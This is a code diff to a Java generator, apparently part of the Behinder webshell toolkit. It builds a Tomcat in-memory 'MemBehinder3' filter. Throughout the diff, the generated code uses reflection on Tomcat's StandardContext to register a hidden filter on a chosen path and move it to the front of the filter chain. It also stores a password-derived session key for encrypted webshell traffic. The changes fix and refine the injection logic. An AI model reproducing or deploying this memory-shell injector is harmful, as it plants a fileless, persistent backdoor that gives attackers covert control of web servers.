@@ -5,6 +5,8 @@ import org.apache.coyote.RequestInfo;
 
 import javax.servlet.Filter;
 import javax.servlet.jsp.PageContext;
+import java.math.BigInteger;
+import java.security.MessageDigest;
 
 public class Behinder4 {
 
@@ -19,11 +21,10 @@ public class Behinder4 {
         classPool.insertClassPath(new ClassClassPath(Behinder4.class));
 
         String cname = "MemBehinder3"+ System.nanoTime();
-        CtClass ctClass = classPool.makeClass("MemBehinder3");
+        CtClass ctClass = classPool.makeClass(cname);
         if (ctClass.getDeclaredConstructors().length != 0) {
             ctClass.removeConstructor(ctClass.getDeclaredConstructors()[0]);
         }
-        ctClass.setSuperclass(classPool.getCtClass(ClassLoader.class.getName()));
         ctClass.setInterfaces(new CtClass[]{classPool.getCtClass(Filter.class.getName())});
         ctClass.addField(CtField.make("public String passwd = \"" + pass + "\";", ctClass));
         ctClass.addField(CtField.make("public String tpath = \"" + path + "\";", ctClass));
@@ -31,10 +32,6 @@ public class Behinder4 {
         ctClass.addField(CtField.make("public javax.servlet.http.HttpServletRequest request = null;", ctClass));
         ctClass.addField(CtField.make("public javax.servlet.http.HttpServletResponse response = null;", ctClass));
 
-
-        ctClass.addConstructor(CtNewConstructor.make("    public MemBehinder3(java.lang.ClassLoader c){\n" +
-                "        super(c);\n" +
-                "    }", ctClass));
 
         ctClass.addConstructor(CtNewConstructor.make("    public MemBehinder3(){}", ctClass));
 
@@ -52,8 +49,6 @@ public class Behinder4 {
                 "        return ret.substring(0,16).toLowerCase();\n" +
                 "    }", ctClass));
 
-        ctClass.addMethod(CtMethod.make("public Class g(byte[] b){\n" +
-                "   return super.defineClass(b, 0, b.length);\n }", ctClass));
 
         ctClass.addMethod(CtMethod.make("    public void parseObj(Object obj) {\n" +
                 "        if (obj.getClass().isArray()) {\n" +
@@ -96,8 +91,8 @@ public class Behinder4 {
                         "        obj.put(\"request\", request);\n" +
                         "        obj.put(\"response\", response);\n" +
                         "        obj.put(\"session\", session);\n"+
-                "               java.lang.System.out.println(111);\n" +
-                "            response.setHeader(\"inject\", \"success\");\n" +
+                "             //  java.lang.System.out.println(111);\n" +
+                "           // response.setHeader(\"inject\", \"success\");\n" +
                 "            String k = md5(passwd);\n" +
                 "            session.putValue(\"u\", k);\n" +
                 "            // 回显密钥\n" +
@@ -130,7 +125,7 @@ public class Behinder4 {
                 "            org.apache.catalina.core.StandardContext standardContext = null;\n" +
                 "            java.lang.reflect.Field stateField = null;\n" +
                 "            javax.servlet.FilterRegistration.Dynamic filterRegistration = null;\n" +
-                "            String var11;" +
+                "            String var11=\"\";" +
                 "            try {\n" +
                 "                contextField = servletContext.getClass().getDeclaredField(\"context\");\n" +
                 "                contextField.setAccessible(true);\n" +
@@ -155,33 +150,32 @@ public class Behinder4 {
                 "                } catch (Exception var23) {\n" +
                 "                    filterMap = Class.forName(\"org.apache.catalina.deploy.FilterMap\");\n" +
                 "                }\n" +
-                "                if(filterMap!=null){\n" +
+                "\n" +
                 "                java.lang.reflect.Method findFilterMaps = standardContext.getClass().getMethod(\"findFilterMaps\",null);\n" +
                 "                Object[] filterMaps = (Object[])(findFilterMaps.invoke(standardContext,null));\n" +
                 "                Object[] tmpFilterMaps = new Object[filterMaps.length];\n" +
                 "                int index = 1;\n" +
                 "\n" +
-                "                for(int i = 0; i < filterMaps.length; ++i) {\n" +
+                "                for(int i = 0; i < filterMaps.length; i++) {\n" +
                 "                    Object filterMapObj = filterMaps[i];\n" +
-                "                    findFilterMaps = filterMap.getMethod(\"getFilterName\",null);\n" +
-                "                    String name = (String)findFilterMaps.invoke(filterMapObj,null);\n" +
-                "                    if (name.equalsIgnoreCase(name)) {\n" +
+                "                    java.lang.reflect.Method findFilterName = filterMap.getMethod(\"getFilterName\",null);\n" +
+                "                    String name1 = (String)findFilterName.invoke(filterMapObj,null);\n" +
+                "                    if (name1.equalsIgnoreCase(name)) {\n" +
                 "                        tmpFilterMaps[0] = filterMapObj;\n" +
                 "                    } else {\n" +
                 "                        tmpFilterMaps[index++] = filterMaps[i];\n" +
                 "                    }\n" +
                 "                }\n" +
                 "\n" +
-                "                java.lang.System.arraycopy(tmpFilterMaps, 0, filterMaps, 0, filterMaps.length);" +
-                "               }\n" +
-                "return \"inject success\";\n"+
+                "                System.arraycopy(tmpFilterMaps, 0, filterMaps, 0, filterMaps.length);\n" +
+                "                return \"inject success\";\n"+
                 "            } catch (Exception e) {\n" +
                 "                   var11 = e.getMessage();\n" +
                 "            } finally {\n" +
                 "                stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);\n" +
                 "            }\n" +
                 "     return var11;    }\n" +
-                "else {\n" +
+                "           else {\n" +
                 "            return \"Filter already exists\";\n" +
                 "        }"+
                 "    }",ctClass));
@@ -189,20 +183,18 @@ public class Behinder4 {
         ctClass.addMethod(CtMethod.make("    public boolean equals(Object obj) {\n" +
                 "        this.parseObj(obj);\n" +
                 "        StringBuffer output = new StringBuffer();\n" +
-                "        String tag_s = \"->|\";\n" +
-                "        String tag_e = \"|<-\";\n" +
                 "\n" +
                 "        try {\n" +
                 "            this.response.setContentType(\"text/html\");\n" +
                 "            this.request.setCharacterEncoding(this.cs);\n" +
                 "            this.response.setCharacterEncoding(this.cs);\n" +
-                "            output.append(this.addFilter(this,\""+cname+"\",\"this.tpath\", this.request));\n" +
+                "            output.append(this.addFilter(this,\"MemBehinder3\",this.tpath, this.request));\n" +
                 "        } catch (Exception var7) {\n" +
                 "            output.append(\"ERROR:// \" + var7.toString());\n" +
                 "        }\n" +
                 "\n" +
                 "        try {\n" +
-                "            this.response.getWriter().print(tag_s + output.toString() + tag_e);\n" +
+                "            this.response.getWriter().print(output.toString());\n" +
                 "            this.response.getWriter().flush();\n" +
                 "            this.response.getWriter().close();\n" +
                 "        } catch (Exception var6) {\n" +
@@ -212,6 +204,19 @@ public class Behinder4 {
 
 
         return ctClass.toBytecode();
+    }
+
+    public static String md5(String var0) {
+        String var1 = null;
+
+        try {
+            MessageDigest var2 = MessageDigest.getInstance("MD5");
+            var2.update(var0.getBytes(), 0, var0.length());
+            var1 = (new BigInteger(1, var2.digest())).toString(16).toUpperCase();
+        } catch (Exception var4) {
+        }
+
+        return var1.substring(0, 16).toLowerCase();
     }
 
 }
